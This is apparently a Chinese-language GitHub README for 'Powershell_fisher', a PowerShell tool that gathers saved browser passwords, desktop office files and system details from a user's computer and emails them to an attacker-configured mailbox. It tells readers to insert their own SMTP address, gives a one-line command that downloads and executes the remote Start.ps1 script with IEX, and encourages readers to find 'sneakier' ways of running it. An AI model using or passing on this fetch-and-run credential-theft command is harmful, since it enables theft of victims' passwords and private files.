# Powershell_fisher
    利用powershell收集用户浏览器中保存的密码，桌面办公文件，电脑硬件软件信息。发送到指定邮件



### 一、 更改GetPass.ps1和Star.ps1更改如下内容为自己邮箱`邮箱需要开启smtp`
  ![images](http://ww1.sinaimg.cn/large/0060lm7Tgw1f668ie4c4tj30mj06zdh0.jpg)

### 二、 更改GetPas.ps1
  ![images](http://ww3.sinaimg.cn/large/0060lm7Tgw1f668noe6m4j30kf02gdgd.jpg)
  
### 三、 调用
  `powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kalivim/Powershell_fisher/master/Start.ps1');`
  
> 调用只是提供思路,怎样更猥琐的去实现这条命令,就看大家的发挥了
